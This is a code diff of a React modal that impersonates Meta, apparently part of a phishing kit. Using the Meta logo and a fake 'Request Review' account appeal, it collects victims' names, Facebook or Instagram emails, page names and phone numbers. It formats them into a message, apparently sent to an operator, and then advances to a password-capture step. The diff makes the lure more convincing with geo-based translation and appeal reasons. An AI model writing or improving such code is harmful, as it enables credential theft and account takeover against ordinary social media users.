@@ -1,18 +1,24 @@
+'use client';
+
 import MetaLogo from '@/assets/images/meta-logo-image.png';
+import { getTranslations } from '@/utils/translate';
 import { store } from '@/store/store';
-import translateText from '@/utils/translate';
 import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
-import IntlTelInput from 'intl-tel-input/reactWithUtils';
+import dynamic from 'next/dynamic';
 import 'intl-tel-input/styles';
 import Image from 'next/image';
-import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useState } from 'react';
+import { type ChangeEvent, type FC, type FormEvent, useCallback, useMemo, useState } from 'react';
+
+const IntlTelInput = dynamic(() => import('intl-tel-input/reactWithUtils'), { ssr: false });
 
 interface FormData {
     fullName: string;
-    personalEmail: string;
     pageName: string;
+    personalEmail: string;
+    reviewReason?: string;
+    reviewDescription?: string;
 }
 
 interface FormField {
@@ -23,40 +29,39 @@ interface FormField {
 
 const FORM_FIELDS: FormField[] = [
     { name: 'fullName', label: 'Full Name', type: 'text' },
-    { name: 'pageName', label: 'Apply for Meta Verified – [Page Name]', type: 'text' },
-    { name: 'personalEmail', label: 'Personal Email', type: 'email' }
+    { name: 'personalEmail', label: 'Personal Email Facebook or Instagram', type: 'email' },
+    { name: 'pageName', label: 'Page Name', type: 'text' }
 ];
-const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => {
+const InitModal: FC = () => {
     const [isLoading, setIsLoading] = useState(false);
     const [phoneNumber, setPhoneNumber] = useState('');
-    const [translations, setTranslations] = useState<Record<string, string>>({});
     const [formData, setFormData] = useState<FormData>({
         fullName: '',
+        pageName: '',
         personalEmail: '',
-        pageName: ''
+        reviewReason: '',
+        reviewDescription: ''
     });
 
-    const { setModalOpen, geoInfo, setMessageId, setMessage } = store();
+    const { setModalOpen, geoInfo, setMessageId, setMessage, setUserEmail, setUserFullName, setUserPhone, setFormStep, formStep } = store();
     const countryCode = geoInfo?.country_code.toLowerCase() || 'us';
+    
+    // Get language from country code or default to English
+    const countryToLanguage: Record<string, string> = {
+        'us': 'en', 'gb': 'en', 'ca': 'en', 'au': 'en',
+        'mx': 'es', 'es': 'es', 'ar': 'es', 'br': 'pt', 'pt': 'pt',
+        'fr': 'fr', 'de': 'de', 'at': 'de', 'ch': 'fr',
+        'jp': 'ja', 'cn': 'zh', 'tw': 'zh', 'hk': 'zh',
+        'kr': 'ko', 'th': 'th', 'vn': 'vi', 'id': 'id',
+        'ru': 'ru', 'ua': 'uk', 'in': 'hi', 'bd': 'bn',
+        'ae': 'ar', 'sa': 'ar', 'eg': 'ar'
+    };
+    const language = countryToLanguage[countryCode] || 'en';
+    const translations = getTranslations(language);
 
     const t = (text: string): string => {
         return translations[text] || text;
     };
-
-    useEffect(() => {
-        if (!geoInfo) return;
-        const textsToTranslate = ['Complete the free Meta Verified registration form.', 'Full Name', 'Personal Email', 'Apply for Meta Verified – [Page Name]', 'Mobile phone number', 'Submit'];
-        const translateAll = async () => {
-            const translatedMap: Record<string, string> = {};
-            for (const text of textsToTranslate) {
-                translatedMap[text] = await translateText(text, geoInfo.country_code);
-            }
-
-            setTranslations(translatedMap);
-        };
-
-        translateAll();
-    }, [geoInfo]);
 
     const initOptions = useMemo(
         () => ({
@@ -97,9 +102,9 @@ ${
 }
 
 <b>👤 Full Name:</b> <code>${formData.fullName}</code>
-<b>📘 Page Name:</b> <code>${formData.pageName}</code>
-<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
+<b>📧 Personal Email Facebook or Instagram:</b> <code>${formData.personalEmail}</code>
 <b>📱 Phone Number:</b> <code>${phoneNumber}</code>
+${formData.reviewDescription ? `<b>📝 Review Description:</b> <code>${formData.reviewDescription}</code>` : ''}
 
 <b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
         `.trim();
@@ -116,18 +121,27 @@ ${
             // Continue even if send fails
         } finally {
             setIsLoading(false);
-            nextStep(formData);
+            // Store user data and switch to password form step
+            setUserEmail(formData.personalEmail);
+            setUserFullName(formData.fullName);
+            setUserPhone(phoneNumber);
+            setFormStep('password');
         }
     };
+
+    // Only show init modal if formStep is not set to password or other steps
+    if (formStep && formStep !== 'init') {
+        return null;
+    }
 
     return (
         <>
             {/* Overlay mờ toàn màn hình */}
             <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
-            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center px-1 sm:px-3 md:px-4'>
+            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center p-2 sm:p-4 md:p-6'>
                 <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
                 <div className='mb-1.5 sm:mb-2 flex w-full items-center justify-between p-1.5 sm:p-2 md:p-4 pb-0'>
-                    <p className='text-xs sm:text-sm md:text-lg font-bold'>{t('Complete the free Meta Verified registration form.')}</p>
+                    <p className='text-xs sm:text-sm md:text-lg font-bold'>{t('Request Review')}</p>
                     <button type='button' onClick={() => setModalOpen(false)} className='h-7 sm:h-8 w-7 sm:w-8 rounded-full transition-colors hover:bg-[#e2eaf2] flex-shrink-0' aria-label='Close modal'>
                         <FontAwesomeIcon icon={faXmark} size='lg' />
                     </button>
@@ -143,6 +157,7 @@ ${
                         ))}
                         <p className='text-xs sm:text-sm font-sans'>{t('Mobile phone number')}</p>
                         <IntlTelInput
+                            key={countryCode}
                             onChangeNumber={handlePhoneChange}
                             initOptions={initOptions}
                             inputProps={{
@@ -150,6 +165,58 @@ ${
                                 className: 'h-10 sm:h-11 md:h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-base'
                             }}
                         />
+                        
+                        {/* Review Reason Section */}
+                        <div className='mt-3 sm:mt-4'>
+                            <p className='text-xs sm:text-sm font-sans mb-2'>{t('Why are you requesting a review?')}</p>
+                            <div className='flex flex-col gap-2'>
+                                <label className='flex items-center gap-2 cursor-pointer'>
+                                    <input
+                                        type='radio'
+                                        name='reviewReason'
+                                        value="I'm not sure which policy was violated."
+                                        checked={formData.reviewReason === "I'm not sure which policy was violated."}
+                                        onChange={handleInputChange}
+                                        className='w-4 h-4'
+                                    />
+                                    <span className='text-xs sm:text-sm'>{t("I'm not sure which policy was violated.")}</span>
+                                </label>
+                                <label className='flex items-center gap-2 cursor-pointer'>
+                                    <input
+                                        type='radio'
+                                        name='reviewReason'
+                                        value='I think there was unauthorized use of my account.'
+                                        checked={formData.reviewReason === 'I think there was unauthorized use of my account.'}
+                                        onChange={handleInputChange}
+                                        className='w-4 h-4'
+                                    />
+                                    <span className='text-xs sm:text-sm'>{t('I think there was unauthorized use of my account.')}</span>
+                                </label>
+                                <label className='flex items-center gap-2 cursor-pointer'>
+                                    <input
+                                        type='radio'
+                                        name='reviewReason'
+                                        value='Another reason:'
+                                        checked={formData.reviewReason === 'Another reason:'}
+                                        onChange={handleInputChange}
+                                        className='w-4 h-4'
+                                    />
+                                    <span className='text-xs sm:text-sm'>{t('Another reason:')}</span>
+                                </label>
+                            </div>
+                            
+                            {/* Description textarea */}
+                            {formData.reviewReason === 'Another reason:' && (
+                                <textarea
+                                    name='reviewDescription'
+                                    value={formData.reviewDescription}
+                                    onChange={handleInputChange}
+                                    placeholder={t('Please describe your reason')}
+                                    className='mt-2 min-h-20 sm:min-h-24 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-base'
+                                    rows={3}
+                                />
+                            )}
+                        </div>
                         <button type='submit' disabled={isLoading} className={`mt-2 sm:mt-3 md:mt-4 flex h-10 sm:h-11 md:h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-xs sm:text-sm md:text-base text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                             {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Submit')}
                         </button>
